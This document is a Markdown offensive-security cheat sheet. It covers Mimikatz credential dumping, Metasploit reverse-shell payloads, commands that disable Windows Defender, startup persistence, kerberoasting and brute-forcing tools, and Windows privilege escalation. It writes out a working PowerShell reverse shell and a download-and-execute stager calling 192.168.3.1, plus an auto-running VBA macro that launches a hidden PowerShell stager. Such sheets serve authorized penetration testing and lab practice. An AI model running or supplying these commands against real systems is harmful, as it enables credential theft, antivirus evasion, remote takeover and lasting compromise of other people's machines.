# Mimikatz
## Setup
### Get debug privilege
```
debug::privilege
```
### Impersonate system
```
token::elevate
```

## Credentials collecting
### LSASS
```
lsadump::lsa /patch
```
### SAM
```
lsadump::sam
```
### Logged in users
```
sekurlsa::logonpasswords
```

## Misc
### Pass the hash
```
sekurlsa::pth /user: /domain: /ntlm: /run:powershell
```

# Metasploit
## Payloads
### Staged
- ```windows/meterpreter/reverse_tcp```
- ```windows/shell/reverse_tcp```
- ```linux/x86/meterpreter/reverse_tcp```
- ```linux/x86/shell/reverse_tcp```
- ```linux/x64/meterpreter/reverse_tcp```
- ```linux/x64/shell/reverse_tcp```
### Stageless
- ```windows/meterpreter_reverse_tcp```
- ```windows/shell_reverse_tcp```
- ```linux/x86/meterpreter_reverse_tcp```
- ```linux/x86/shell_reverse_tcp```
- ```linux/x64/meterpreter_reverse_tcp```
- ```linux/x64/shell_reverse_tcp```

## Remote session wrappers
### SSH
```
auxiliary/scanner/ssh/ssh_login
```
### SMB
```
exploit/windows/smb/psexec
```
## Pivoting
- ```
post/multi/manage/autoroute
```
- ```
auxiliary/server/socks_proxy
```

## Gathering
### Enum Shares
```
post/windows/gather/enum_shares
```


## Persistence
```
exploit/windows/local/persistence
```

# Powershell
## Windows Defender
### Add exclusion
```powershell
Set-MpPreference -ExclusionPath
```
### Disable RTP
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Scheduled jobs
### Register
```powershell
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
Register-ScheduledJob -Trigger $trigger -FilePath "" -Name ""
```
### List
```powershell
Get-ScheduledJob
```
### Unregister 
```powershell
Unregister-ScheduledJob -Name "" -Force
```

## Misc
### Download
```powershell
Invoke-WebRequest -Uri "" -OutFile ""
```

### Reverse Shell
#### Stager
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.1:8888/stage.ps1')
```
#### Stage
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.3.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('192.168.3.1',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```
#### VBA payload
```vba
Sub lulz()
    strCommand = "powershell -windowstyle hidden {obfuscated_stager}"
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec(strCommand)
    strOutput = WshShellExec.StdOut.ReadAll
End Sub
Sub Auto_Open()
    lulz
End Sub
```
## Invoke-Obfuscation
```ps1
Invoke-Obfuscation -ScriptPath .\script.ps1 -Quiet -NoExit -Command 'Token\\String\\1,2,\\Whitespace\\1,\\Command\\1,3'
```

# AD Enumeration/Exploitation
## crackmapexec
### Enumerating PTH
```bash
crackmapexec smb ip -u user -d domain -H hash
```

## Kerbrute
### Enum usernames
```bash
kerbrute userenum --dc domain controller -d domain -o logfile usernameslist
```

## impacket
### Get SPNs
```bash
./GetUserSPNs.py -dc-ip domain controller -request domain/user:password
```
### Get kerberoastable users
```bash
./GetNPUsers.py domain/ -no-pass -usersfile file
./GetNPUsers.py domain/user:password
```
### Request TGT (disabled pre-auth)
```bash
./GetNPUsers.py domain/user -no-pass
```


# Hashcat
### Bruteforce
```bash
hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt ?1?1?1?1
```

### Charsets
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
```

### KRB5TGS
```
13100
```
### NTML
```
1000
```

# Hydra
### Attack POST form
```bash
hydra -l login -P pass.txt example.com http-post-form "/admin/login:username=^USER^&pass=^PASS^:F=login failed"
```

# Windows Priv Esc
## Registry
### Query AutoRun executables
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

### Query service info
`reg query HKLM\System\CurrentControlSet\Services\service1`

### AlwaysInstallElevated
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
### Query for passwords 
`reg query HKLM /f password /t REG_SZ /s`

## accesschk.exe
### Check users permissions on service
`accesschk.exe /accepteula -uwcqv user svc`

### Check write permissions on directory
`accesschk.exe /accepteula -uwdq "path"`

### Check permissions on registry entry
`accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

# Misc
### PHP filter
```php://filter/convert.base64-encode/resource=```
### Blank LM hash
```aad3b435b51404eeaad3b435b51404ee```
### xfreerdp
```bash
xfreerdp /u: /p: /d: /v:
```
